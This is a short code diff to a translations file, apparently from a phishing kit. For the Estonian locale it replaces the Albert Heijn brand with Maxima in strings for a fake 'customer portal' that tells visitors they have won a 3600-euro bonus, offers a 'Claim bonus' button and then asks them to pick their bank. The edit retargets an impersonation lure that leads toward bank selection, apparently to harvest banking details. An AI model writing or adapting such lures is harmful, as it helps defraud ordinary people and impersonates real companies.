@@ -115,10 +115,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Verwerken..."
   },
   et: {
-    portal_name: "Albert Heijn Kliendiportaal",
-    support_center_name: "Albert Heijn Klienditeenindus",
-    win_title: "Eksklusiivne Albert Heijn Boonus",
-    win_subtitle: "Palju õnne! Olete valitud tänasesse Albert Heijn kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.",
+    portal_name: "Maxima Kliendiportaal",
+    support_center_name: "Maxima Klienditeenindus",
+    win_title: "Eksklusiivne Maxima Boonus",
+    win_subtitle: "Palju õnne! Olete valitud tänasesse Maxima kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.",
     win_button: "Lunasta boonus",
     banken_title: "Vali oma pank",
     banken_subtitle: "Jätkamiseks vali oma pank.",
